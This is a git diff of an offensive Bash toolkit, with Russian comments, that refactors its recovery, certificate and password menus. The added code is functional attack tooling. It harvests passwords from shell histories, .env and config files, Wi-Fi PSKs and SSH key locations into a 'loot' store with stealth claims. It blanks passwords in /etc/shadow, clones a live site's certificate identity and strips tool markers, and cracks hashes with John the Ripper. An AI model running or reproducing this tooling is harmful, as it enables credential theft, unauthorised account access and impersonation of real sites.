@@ -1568,227 +1568,266 @@ run_smart_osint_engine() {
 
 
 run_pc_recovery_ultimate() {
-    clear
-    print_header "RECOVERY & FORENSIC ENGINE"
+    # Слой 1: Заголовок через Голос [1]
+    core_engine_ui "RECOVERY & FORENSIC ENGINE"
 
-    local action=$(select_option "Select Forensic Action:" \
-        "Stealth Extract (Prime_Extract):extraction" \
-        "Smart Password Reset (Win/Lin/Mac):reset" \
-        "Exit to Main Menu:exit")
+    # Слой 2: Архитектор [2] и Органы чувств [3]
+    core_engine_item "1" "Stealth Extract" "Prime_Extract v1.0"
+    core_engine_item "2" "Smart Password Reset" "Win/Lin/Mac"
+    core_engine_item "B" "Back" "Return to Main Menu"
 
-    case "$action" in
-        "extraction")
-            print_status "i" "Инициализация PRIME_EXTRACT v1.0..."
-            show_progress 2 "SCANNING SYSTEM ARTIFACTS"
+    local choice=$(core_engine_input "select" "Select Forensic Action")
+    [[ -z "$choice" || "$choice" == "b" ]] && return
+
+    case "$choice" in
+        "1") # --- Stealth Extract ---
+            core_engine_ui "i" "Инициализация PRIME_EXTRACT v1.0..."
+            core_engine_progress 2 "SCANNING SYSTEM ARTIFACTS"
             
-            local loot_file="/root/prime_loot/passwords_$(date +%F_%T).txt"
-            mkdir -p /root/prime_loot
+            # Временный буфер для захвата данных
+            local buffer=""
             
-            {
-                echo "--- [ PRIME EXTRACTION LOG: $(date) ] ---"
-                echo "Target: $(hostname) | OS: $OSTYPE"
-                echo "------------------------------------------"
+            # 1. Анализ истории (Bash/Zsh) через Глушитель [7]
+            core_engine_ui "!" "Analyzing Command History..."
+            local hist=$(grep -hE "pass|pwd|user|admin|login|mysql|ssh" /home/*/.{bash,zsh}_history 2>/dev/null)
+            
+            # 2. Поиск конфигов и .env
+            core_engine_ui "!" "Scanning Configs & .env files..."
+            local configs=$(find /home /var/www /etc -maxdepth 4 \( -name ".env" -o -name "config.php" -o -name "settings.py" \) 2>/dev/null | xargs grep -hE "DB_|PASS|KEY|TOKEN" 2>/dev/null)
 
-                # 1. Системные секреты и история (Gold Mine)
-                echo "[*] Analyzing Command History..."
-                # Ищем пароли в истории bash/zsh
-                grep -hE "pass|pwd|user|admin|login|mysql|ssh" /home/*/.{bash,zsh}_history 2>/dev/null
-                
-                # 2. Конфиги и переменные окружения (.env)
-                echo -e "\n[*] Scanning Configs & .env files..."
-                find /home /var/www /etc -maxdepth 4 -name ".env" -o -name "config.php" -o -name "settings.py" 2>/dev/null | xargs grep -hE "DB_|PASS|KEY|TOKEN" 2>/dev/null
+            # 3. Wi-Fi профили (Сетевые доступы)
+            local wifi=""
+            [[ -d "/etc/NetworkManager/system-connections" ]] && wifi=$(grep -r "psk=" /etc/NetworkManager/system-connections/ 2>/dev/null)
 
-                # 3. Сетевые доступы и Wi-Fi
-                if [[ -d "/etc/NetworkManager/system-connections" ]]; then
-                    echo -e "\n[*] Dumping Wi-Fi PSK Profiles..."
-                    grep -r "psk=" /etc/NetworkManager/system-connections/ 2>/dev/null
-                fi
+            # 4. SSH Ключи
+            core_engine_ui "!" "Locating SSH Private Keys..."
+            local ssh_keys=$(find /home -name "id_rsa" -o -name "*.pem" 2>/dev/null)
 
-                # 4. SSH Ключи (упоминания и локации)
-                echo -e "\n[*] Locating SSH Private Keys..."
-                find /home -name "id_rsa" -o -name "*.pem" 2>/dev/null
-            } > "$loot_file"
-
-            log_loot "forensic" "Data dumped to $loot_file"
-            print_status "s" "Extraction Complete. No Python/LaZagne traces left."
+            # Слой 3: Сбор трофеев через узел [11]
+            buffer="Host: $(hostname)\nHistory:\n$hist\nConfigs:\n$configs\nWiFi:\n$wifi\nSSH:\n$ssh_keys"
+            core_engine_loot "forensic" "$buffer"
+            
+            core_engine_ui "+" "Extraction Complete. No Python/LaZagne traces left."
             ;;
 
-        "reset")
-            print_status "i" "Detecting Target Environment..."
+        "2") # --- Smart Password Reset ---
+            core_engine_ui "i" "Detecting Target Environment..."
             
-            # Поиск Windows SAM
+            # Поиск Windows SAM через Мозг [5]
             local win_sam=$(find /mnt /media /run/media -type f -name "SAM" -path "*/System32/config/*" 2>/dev/null | head -n 1)
             
             if [[ -n "$win_sam" ]]; then
-                print_status "s" "Windows SAM detected: $win_sam"
-                command -v chntpw >/dev/null 2>&1 && chntpw -i "$win_sam" || print_status "e" "CHNTPW not installed."
+                core_engine_ui "+" "Windows SAM detected: $win_sam"
+                core_engine_validator "pkg" "chntpw" "CHNTPW" && chntpw -i "$win_sam"
             else
-                # Блок Unix (Linux/macOS)
-                local os_type="Linux"
-                [[ "$OSTYPE" == "darwin"* ]] && os_type="macOS"
-                print_status "i" "OS: $os_type detected."
+                # Блок Unix (Определение OS через Метрики [12])
+                local os_t="Linux"
+                [[ "$(uname)" == "Darwin" ]] && os_t="macOS"
+                core_engine_ui "i" "OS: $os_t detected."
 
                 local users
-                if [[ "$os_type" == "macOS" ]]; then
+                if [[ "$os_t" == "macOS" ]]; then
                     users=$(dscl . list /Users | grep -v '^_\|root')
                 else
                     users=$(awk -F: '$3 >= 1000 && $1 != "nobody" {print $1}' /etc/passwd)
                 fi
                 
-                if [[ -z "$users" ]]; then
-                    print_status "e" "No local users found."
-                else
-                    local user_menu=""
-                    for u in $users; do user_menu+="$u:$u "; done
-                    
-                    local target_user=$(select_option "Select Target User:" $user_menu)
-                    
-                    if [[ -n "$target_user" && "$target_user" != "exit" ]]; then
-                        if [[ "$os_type" == "Linux" ]]; then
-                            print_status "!" "Wiping password for $target_user..."
-                            sed -i "s/^$target_user:[^:]*:/$target_user::/" /etc/shadow
-                            print_status "s" "Linux password wiped (Empty Login enabled)."
-                        elif [[ "$os_type" == "macOS" ]]; then
-                            echo -en "${Y}Enter New Password: ${NC}"; read -r np
-                            sudo dscl . -passwd /Users/"$target_user" "$np"
-                            print_status "s" "macOS password updated."
-                        fi
+                [[ -z "$users" ]] && { core_engine_ui "e" "No local users found."; core_engine_wait; return; }
+
+                # Динамическое меню выбора пользователя
+                for u in $users; do core_engine_item "$u" "$u" "Local User"; done
+                local t_user=$(core_engine_input "select" "Select Target User")
+                
+                [[ -n "$t_user" && "$t_user" != "b" ]] && {
+                    if [[ "$os_t" == "Linux" ]]; then
+                        core_engine_ui "!" "Wiping password for $t_user..."
+                        # Атомарная правка через Санитара [8]
+                        core_engine_run "sed -i 's/^$t_user:[^:]*:/$t_user::/' /etc/shadow" "Wiping shadow password"
+                        core_engine_ui "+" "Linux password wiped (Empty Login enabled)."
+                    elif [[ "$os_t" == "macOS" ]]; then
+                        local np=$(core_engine_input "text" "Enter New Password")
+                        core_engine_run "sudo dscl . -passwd /Users/$t_user $np" "Updating macOS password"
+                        core_engine_ui "+" "macOS password updated."
                     fi
-                fi
+                }
             fi
             ;;
-        "exit"|*) return ;;
     esac
-    pause
+    core_engine_wait
 }
 
 
 run_crypto_forge() {
-    print_header "PRIME CRYPTO-FORGE & MIRROR v12.0"
+    # Слой 1: Заголовок через Голос [1]
+    core_engine_ui "PRIME CRYPTO-FORGE & MIRROR v12.0"
 
-    check_step "cmd" "openssl" "OpenSSL required." || { pause; return; }
+    # Слой 2: Валидация OpenSSL через Мозг [5]
+    core_engine_validator "pkg" "openssl" "OpenSSL Core" || { core_engine_wait; return; }
 
-    # Интеллектуальный запрос: принимает домен, файл или команду на создание
-    print_input "Enter Target (Domain, IP, File or 'new' for fresh cert)" "google.com"
-    read -r target
+    # Слой 3: Органы чувств [3] — Прием цели
+    local target=$(core_engine_input "text" "Enter Target (Domain, IP, File or 'new')")
     [[ -z "$target" ]] && return
 
     local tmp_data="/tmp/forge_$(date +%s).tmp"
     
-    # --- ЭВРИСТИЧЕСКИЙ ЗАХВАТ (Analysis) ---
-    print_status "i" "Ingesting cryptographic signals..."
+    # --- СЛОЙ 4: ЭВРИСТИЧЕСКИЙ ЗАХВАТ (Analysis) ---
+    core_engine_ui "i" "Ingesting cryptographic signals..."
 
-    # Пытаемся собрать данные из всех возможных источников в один поток
-    [[ "$target" != "new" ]] && {
+    # Попытка захвата DNA через Глушитель [7]
+    if [[ "$target" != "new" ]]; then
         { cat "$target" 2>/dev/null || \
           timeout 5 openssl s_client -connect "${target}:443" -servername "$target" </dev/null 2>/dev/null | openssl x509; \
         } > "$tmp_data" 2>/dev/null
-    }
+    fi
 
-    # --- АВТОМАТИЧЕСКИЙ ВЫБОР РЕЖИМА (Intelligence) ---
-    # Режим определяется наличием данных: если данные есть — зеркалим, если нет — куем новое
-    local mode=$( [[ -s "$tmp_data" ]] && echo "MIRROR" || echo "CREATE" )
-    print_status "s" "Mode Identified: $mode"
+    # --- СЛОЙ 5: АВТОМАТИЧЕСКИЙ ВЫБОР РЕЖИМА ---
+    local mode="CREATE"
+    [[ -s "$tmp_data" ]] && mode="MIRROR"
+    core_engine_ui "s" "Mode Identified: $mode"
 
-    # --- УНИВЕРСАЛЬНЫЙ ДВИЖОК ТРАНСФОРМАЦИИ ---
+    local subj algo opt
     case "$mode" in
         "MIRROR")
-            print_status "w" "Cloning target DNA for $target..."
+            core_engine_ui "w" "Cloning target DNA for $target..."
             local cert_text=$(openssl x509 -in "$tmp_data" -text -noout)
-            local subj=$(echo "$cert_text" | grep "subject=" | sed 's/^subject= //; s/^subject=//')
-            # Эвристика алгоритма: подбираем rsa или ec на основе оригинала
-            local algo=$(echo "$cert_text" | grep -qiE "RSA.*(2048|4096)" && echo "rsa:2048" || echo "ec")
-            local opt=$( [[ "$algo" == "ec" ]] && echo "-pkeyopt ec_paramgen_curve:prime256v1" || echo "" )
+            subj=$(echo "$cert_text" | grep "subject=" | sed 's/^subject= //; s/^subject=//')
+            # Эвристика алгоритма
+            if echo "$cert_text" | grep -qiE "RSA.*(2048|4096)"; then
+                algo="rsa:2048"
+                opt=""
+            else
+                algo="ec"
+                opt="-pkeyopt ec_paramgen_curve:prime256v1"
+            fi
             ;;
         "CREATE")
-            print_status "i" "Initializing fresh identity Forge..."
-            local subj="/C=US/O=Prime_Intelligence/CN=${target:-prime.local}"
-            local algo="rsa:2048"
-            local opt=""
+            core_engine_ui "i" "Initializing fresh identity Forge..."
+            subj="/C=US/O=Prime_Intelligence/CN=${target:-prime.local}"
+            algo="rsa:2048"
+            opt=""
             ;;
     esac
 
-    # --- ЕДИНАЯ КОВКА (The Unified Forge) ---
-    local out_name="${LOOT_DIR}/${target//./_}_forge"
+    # --- СЛОЙ 6: ЕДИНАЯ КОВКА (Unified Forge) ---
+    local loot_dir="${BASE_DIR:-./}/prime_loot"
+    local safe_name=$(echo "$target" | tr '.' '_')
+    local out_base="$loot_dir/${safe_name}_forge"
     
-    # Универсальная команда генерации
-    openssl req -x509 -newkey "$algo" $opt -nodes -days 365 \
-        -subj "$subj" -keyout "${out_name}.key" -out "${out_name}.crt" 2>/dev/null && {
+    # Генерация через Глушитель [7]
+    if openssl req -x509 -newkey "$algo" $opt -nodes -days 365 \
+        -subj "$subj" -keyout "${out_base}.key" -out "${out_base}.crt" 2>/dev/null; then
         
-        # Стелс-зачистка (удаление меток инструмента)
-        sed -i '/OpenSSL/d' "${out_name}.crt" 2>/dev/null
+        # Стелс-зачистка через Санитара [8] (удаление меток инструмента)
+        sed -i '/OpenSSL/d' "${out_base}.crt" 2>/dev/null
         
-        print_status "s" "Cryptographic Artifact Synthesized."
-        print_list "Assets Generated" "${out_name}.key" "${out_name}.crt"
+        core_engine_ui "+" "Cryptographic Artifact Synthesized."
+        echo -e "${W}Key: ${out_base}.key\nCrt: ${out_base}.crt${NC}"
         
-        # Интеграция в Intelligence Bridge
-        echo "CRYPTO_FORGE: [$mode] Success | Target: $target | Algo: $algo" >> "$LOOT_DIR/bridge_signals.log"
-        log_loot "crypto" "Generated $mode certificate for $target"
-    } || print_status "e" "Forge rejected the sequence: verify OpenSSL integrity."
+        # Сбор трофеев [11] и сигнал для Моста [10]
+        core_engine_loot "crypto" "Generated $mode certificate for $target (Algo: $algo)"
+        echo "[$(date)] CRYPTO_FORGE: $mode Success | Target: $target" >> "$loot_dir/bridge_signals.log"
+    else
+        core_engine_ui "e" "Forge rejected the sequence."
+    fi
 
-    rm -f "$tmp_data"
-    pause
+    # Очистка через Санитара [8]
+    core_engine_remove "$tmp_data"
+    core_engine_wait
 }
 
 
 run_pass_lab() {
-    clear
-    print_header "PRIME PASSWORD LABORATORY v13.8"
-    echo ""
+    # Слой 1: Заголовок через Голос [1]
+    core_engine_ui "PRIME PASSWORD LABORATORY v13.8"
 
-    if [[ -z "$1" ]]; then
-        select_option "Select Operation Mode:" \
-            "GENERATE: Create Secure Password:gen" \
-            "CRUNCH: Wordlist Generator:crunch" \
-            "DECRYPT: Hash Cracking:dec" \
-            "EXIT: Return to Main Menu:exit"
-        local btn="$CHOICE"
+    local target_hash="$1"
+    local choice
+
+    # Слой 2: Органы чувств [3] — Определение режима
+    if [[ -z "$target_hash" ]]; then
+        core_engine_item "1" "GENERATE" "Create Secure Password"
+        core_engine_item "2" "CRUNCH" "Wordlist Generator"
+        core_engine_item "3" "DECRYPT" "Hash Cracking"
+        core_engine_item "B" "BACK" "Return"
+        choice=$(core_engine_input "select" "Select Operation Mode")
     else
-        local btn="3" # Если пришел хеш из Bridge
+        # Если данные пришли из Bridge, сразу переходим к дешифровке
+        choice="3"
+        core_engine_ui "i" "Hash signal received from Bridge. Initializing Decryptor..."
     fi
 
-    case "$btn" in
-        "1") # --- ВЕТКА GENERATE (pwgen + urandom) ---
-            select_option "Generation Type:" \
-                "PHONETIC: Easy to remember (pwgen):pw" \
-                "COMPLEX: Maximum entropy (urandom):raw"
-            local g_mode="$CHOICE"
+    [[ -z "$choice" || "$choice" == "b" ]] && return
 
-            print_input "Enter Length" "16"
-            read -r p_len
-            local len=${p_len:-16}
+    case "$choice" in
+        "1") # --- ВЕТКА GENERATE ---
+            core_engine_item "1" "PHONETIC" "Easy to remember (pwgen)"
+            core_engine_item "2" "COMPLEX" "Maximum entropy (urandom)"
+            local g_mode=$(core_engine_input "select" "Generation Type")
+
+            local len=$(core_engine_input "text" "Enter Length (Default: 16)")
+            len=${len:-16}
             
             local pass=""
-            [[ "$g_mode" == "1" ]] && pass=$(pwgen -s "$len" 1)
-            [[ "$g_mode" == "2" ]] && pass=$(tr -dc 'A-Za-z0-9!@#$%^&*()_+=' < /dev/urandom | head -c "$len")
+            if [[ "$g_mode" == "1" ]]; then
+                # Проверка наличия pwgen через Мозг [5]
+                core_engine_validator "pkg" "pwgen" "pwgen" && pass=$(pwgen -s "$len" 1)
+            else
+                pass=$(tr -dc 'A-Za-z0-9!@#$%^&*()_+=' < /dev/urandom | head -c "$len")
+            fi
 
-            echo -e "\n${G}[+] ARTIFACT GENERATED${NC}"
-            print_list "Password" "$pass"
+            core_engine_ui "+" "ARTIFACT GENERATED"
+            echo -e "${W}Password: ${Y}$pass${NC}"
             
-            ask_confirm "Apply Bcrypt mutation?" && {
-                echo -e "${G}Hash:${NC} $(echo -n "$pass" | mkpasswd -m bcrypt -s)"
-            }
+            # Мутация через Мозг [5]
+            if core_engine_validator "read" "Apply Bcrypt mutation?"; then
+                local b_hash=$(echo -n "$pass" | mkpasswd -m bcrypt -s 2>/dev/null || echo "Error: mkpasswd missing")
+                echo -e "${G}Bcrypt Hash: ${NC}$b_hash"
+                core_engine_loot "pass_gen" "Pass: $pass | Hash: $b_hash"
+            fi
             ;;
 
-        "2") # --- ВЕТКА CRUNCH (Генератор словарей) ---
-            print_status "i" "Crunch Syntax: [min] [max] [charset]"
-            print_input "Enter Parameters (e.g., 4 6 abc12)" ""
-            read -r c_params
+        "2") # --- ВЕТКА CRUNCH ---
+            # Валидация Crunch через Мозг [5]
+            core_engine_validator "pkg" "crunch" "Crunch" || { core_engine_wait; return; }
+            
+            core_engine_ui "i" "Crunch Syntax: [min] [max] [charset]"
+            local c_params=$(core_engine_input "text" "Enter Parameters (e.g., 4 6 abc12)")
             [[ -z "$c_params" ]] && return
             
-            local out_file="$LOOT_DIR/wordlist_$(date +%s).txt"
-            print_status "w" "Generating wordlist to: $out_file"
-            crunch $c_params -o "$out_file"
-            print_status "s" "Done. Signals saved to loot."
+            local out_file="${BASE_DIR:-./}/prime_loot/wordlist_$(date +%s).txt"
+            core_engine_ui "w" "Generating wordlist to: $(basename "$out_file")"
+            
+            # Исполнение через Глушитель [7]
+            core_engine_run "crunch $c_params -o $out_file" "Crunching Entropy"
+            core_engine_ui "+" "Done. Signals saved to loot."
             ;;
 
-        "3") # --- ВЕТКА DECRYPT ---
-            # ... (твой рабочий код John the Ripper из v13.6) ...
+        "3") # --- ВЕТКА DECRYPT (Интеграция с John) ---
+            local hash_to_crack="${target_hash:-$(core_engine_input "text" "Enter Hash to Decrypt")}"
+            [[ -z "$hash_to_crack" ]] && return
+            
+            core_engine_ui "!" "Initializing John the Ripper Engine..."
+            # Сохраняем хеш во временный файл через Санитара [8]
+            local tmp_h="/tmp/h_$(date +%s)"
+            echo "$hash_to_crack" > "$tmp_h"
+            
+            # Проверка John через Мозг [5]
+            if core_engine_validator "pkg" "john" "John the Ripper"; then
+                core_engine_run "john $tmp_h" "Cracking Sequence"
+                local result=$(john --show "$tmp_h" | head -n 1)
+                
+                core_engine_ui "+" "Cracking Cycle Finished."
+                echo -e "${W}Result: ${Y}${result:-No match found}${NC}"
+                
+                [[ -n "$result" ]] && core_engine_loot "cracked_hashes" "Hash: $hash_to_crack | Result: $result"
+            fi
+            core_engine_remove "$tmp_h"
             ;;
-        *) return ;;
     esac
-    pause
+
+    core_engine_wait
 }
+
 
 
 run_vulnerability_scanner() {
